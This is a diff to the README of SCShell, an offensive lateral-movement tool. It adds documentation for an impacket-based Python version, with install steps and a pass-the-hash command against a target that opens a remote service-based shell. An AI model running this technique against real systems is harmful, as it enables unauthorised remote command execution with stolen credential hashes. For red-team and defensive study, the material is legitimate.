@@ -53,7 +53,24 @@ I'm using the XblAuthManager as the target which is the Xbox Accessory Managemen
 
 # Passing the Hash
 
-You can use the utility to pass the hash. By default the current process token will be used. You can set the current process token using standard pass the hash approach.
+scshell.py is a python2 & 3 implementation of SCShell. Using impacket project it can easily be used to perform the same lateral movement using pass the hash.
+
+Installation
+```
+pip install impacket
+```
+
+Usage
+```
+python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Command need to use FULL path. No command output.
+SCShell>
+
+```
+
+You can use the `C` utility to pass the hash. By default the current process token will be used. You can set the current process token using standard pass the hash approach.
 
 On the local system
 ```
